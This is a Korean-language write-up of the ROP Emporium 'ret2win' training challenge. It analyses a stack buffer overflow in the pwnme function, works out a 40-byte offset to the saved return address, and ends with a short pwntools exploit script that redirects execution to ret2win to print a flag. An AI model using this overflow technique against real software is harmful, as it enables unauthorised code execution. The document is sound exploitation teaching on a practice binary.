ROP Emporium ret2win
=======================

### 1. 코드 분석

<img width="723" height="205" alt="image" src="https://github.com/user-attachments/assets/c3aebd75-072a-45d4-b8bc-82f4ff193049" />

main함수

<img width="997" height="260" alt="image" src="https://github.com/user-attachments/assets/b49e0945-215d-489a-8716-f30f66038d93" />

pwnme 함수

* 0x20byte 크기의 스택 버퍼 s에 56byte를 입력한다는 점과 read()함수를 사용하기 때문에 NULL 바이트에 대해 걱정할 필요가 없다는 메시지     
* 0x20byte만큼 할당된 스택버퍼 s에 그 이상의 값을 read함수를 통해 입력받기 때문에 버퍼오버플로우 발생

<img width="438" height="145" alt="image" src="https://github.com/user-attachments/assets/459ef853-a7b6-4ab7-b20f-eeb930c95749" />

ret2win에서 system("/bin/cat flag.txt")를 호출하므로 여기로 이어지게 ROP 수행하면 됨

### 2.  오프셋 구하기

<img width="807" height="675" alt="image" src="https://github.com/user-attachments/assets/c6ff1f20-b325-46d3-a3c4-24a73d22a364" />

<img width="765" height="276" alt="image" src="https://github.com/user-attachments/assets/13a52d77-0152-4706-b9fb-454b2b3af248" />

* lea rax,[rbp-0x20]: pwnme는 rbp 기준으로 -0x20 (32바이트) 떨어진 곳에 버퍼를 만든다.
* call <read@plt>: 32바이트짜리 버퍼에 0x38 (56바이트)를 쓴다.

따라서 RET를 덮어쓰기 위해 필요한 오프셋은      

버퍼 크기 (32바이트) + Saved rbp (8바이트) = 40바이트 (0x28)


### 3. 익스플로잇


from pwn import *

p = process("./ret2win")
e = ELF("./ret2win")

ret2win = e.symbols['ret2win']


payload = b'A' * 40
payload += p64(ret2win)

p.sendline(payload)
p.interactive()




